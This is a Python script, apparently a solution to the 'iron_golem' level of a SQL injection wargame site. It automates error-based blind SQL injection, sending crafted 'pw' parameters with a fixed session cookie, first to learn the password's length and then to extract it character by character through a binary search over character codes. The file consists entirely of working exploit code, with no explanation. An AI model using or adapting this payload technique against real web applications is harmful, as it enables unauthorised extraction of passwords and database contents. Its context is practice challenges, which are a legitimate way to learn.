import requests, urllib

url = "https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

plen = 1
while True:
    param = {"pw": "0' or if(length(pw)=" + str(plen) + ", 1, (select 1 union select 2))-- -"}
    response = requests.get(url, params=param, cookies=cookie)
    if "<hr>query : <strong>" in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen / 4): # devide the password_length by 4 because the password is unicode
    now_value = 256 / 2
    for j in range(256):
        param = {"pw": "0' or if(ord(mid(pw," + str(i+1) + ",1))>=" + str(now_value) + ", 1, (select 1 union select 2))-- -"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<hr>query : <strong>" in response.text:
            param = {"pw": "0' or if(ord(mid(pw," + str(i+1) + ",1))=" + str(now_value) + ", 1, (select 1 union select 2))-- -"}
            response = requests.get(url, params=param, cookies=cookie)
            if "<hr>query : <strong>" in response.text:
                password += chr(now_value)
                break
            now_value += 256 / 2**(j+2)
        else:
            now_value -= 256 / 2**(j+2)
        print("[*] searching " + str(i+1) + " password character.. now " + str(now_value))
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)